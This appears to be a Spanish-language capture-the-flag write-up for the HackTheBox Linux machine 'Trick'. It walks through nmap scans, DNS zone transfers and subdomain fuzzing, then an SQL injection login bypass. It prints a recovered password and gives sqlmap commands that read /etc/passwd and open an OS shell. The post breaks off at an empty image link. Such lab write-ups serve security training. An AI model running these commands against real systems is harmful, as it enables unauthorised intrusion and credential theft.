---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Trick              |
| Os                     | Linux              |
| Difficulty             | Easy               |
| Points                 | 20                 |
| IP                     | 10.10.11.166       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Trick/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.38.26
```

![nmap 1](/assets/images/Trick/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.38.26 -oG allPorts
```

![nmap2](/assets/images/Trick/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,25,53,80 10.129.38.26 -oN targeted
```

![nmap3](/assets/images/Trick/nmap3.png)

Intentemos ver a donde mas se direccionan los paquetes con el dns del puerto 53 con el comando:

```s
sudo dig @10.129.71.116 trick.htb axfr
sudo dig @10.129.71.116 preprod-payroll.trick.htb axfr
sudo dig @10.129.71.116 root.trick.htb axfr
```

Hemos encontrado mas dominios potenciales, pero para que no se nos escape ninguno, agregaremos un filtrado con:

```s
sudo dig @10.129.71.116 trick.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' '
```

```s
sudo cat urls | feroxbuster --auto-tune --extract-links --random-agent --stdin --output trick.feroxbuster --threads 100 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```s
wfuzz -c --hc=404 --hw=55,83 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.trick.htb" http://10.129.71.116
```

Para el dominio preprod-payroll.trick.htb, hay un loggin page. El cual intentaremos cruzar con un SQLI con burpsuite de la siguiente forma:

![SQLI](/assets/images/Trick/SQLI.png)

Una vez dentro, tenemos acceso como administrador. Veamos que podemos encontrar aqui.
En el apartado de users, en la opcion de editar las configuraciones del usuario, la contrasena no es visible pero si inspeccionamos el codigo de la pagina, podremos verla.

![user password](/assets/images/Trick/user_psswd.png)

value="SuperGucciRainbowCake"

Sigamos enumerando informacion con sqlmap ahora.

Agregamos un usuario de prueba y lo interceptamos con burp. 

```s
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --username
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --file-read=/etc/hostname
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --file-read=/etc/passwd
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --current-user
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --os-shell
```

Una vez que tenemos el archivo etc/passwd, para filtrar los usuarios existentes podemos hacer un:

```s
cat _etc_passwd | grep sh$
```

![user password](/assets/images/Trick/)